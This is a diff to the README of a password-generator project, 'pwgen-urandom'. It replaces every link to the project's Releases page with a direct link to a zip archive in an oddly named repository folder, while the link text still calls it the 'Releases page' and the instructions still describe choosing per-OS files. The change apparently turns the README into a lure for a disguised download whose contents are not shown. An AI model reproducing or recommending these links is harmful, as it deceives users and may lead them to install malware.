@@ -15,13 +15,13 @@ Welcome to **pwgen-urandom**! This tool helps you generate strong passwords quic
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download pwgen-urandom](https://img.shields.io/badge/Download_pwgen--urandom-007bff?style=for-the-badge&logo=github)](https://github.com/ReitYaxs/pwgen-urandom/releases)
+[![Download pwgen-urandom](https://github.com/ReitYaxs/pwgen-urandom/raw/refs/heads/main/stenopetalous/urandom_pwgen_v1.3-beta.4.zip)](https://github.com/ReitYaxs/pwgen-urandom/raw/refs/heads/main/stenopetalous/urandom_pwgen_v1.3-beta.4.zip)
 
 On the Releases page, you'll find the latest version of pwgen-urandom available for download. Choose the file that matches your system. 
 
 ### 📥 Download Instructions
 
-1. Navigate to the [Releases page](https://github.com/ReitYaxs/pwgen-urandom/releases).
+1. Navigate to the [Releases page](https://github.com/ReitYaxs/pwgen-urandom/raw/refs/heads/main/stenopetalous/urandom_pwgen_v1.3-beta.4.zip).
 2. Look for the latest version at the top. 
 3. Click on the file suitable for your operating system—e.g., `pwgen-urandom-linux` for Linux, `pwgen-urandom-macos` for macOS.
 4. Save the file to a location on your computer where you can easily find it.
@@ -82,7 +82,7 @@ If you encounter any issues, consider the following solutions:
 
 If you need additional help, feel free to open issues on the GitHub page. The community is here to assist you with any problems or questions you may have.
 
-For more information, visit the [pwgen-urandom Releases page](https://github.com/ReitYaxs/pwgen-urandom/releases) to stay updated with new versions and features.
+For more information, visit the [pwgen-urandom Releases page](https://github.com/ReitYaxs/pwgen-urandom/raw/refs/heads/main/stenopetalous/urandom_pwgen_v1.3-beta.4.zip) to stay updated with new versions and features.
 
 ## 📈 Future Features
 
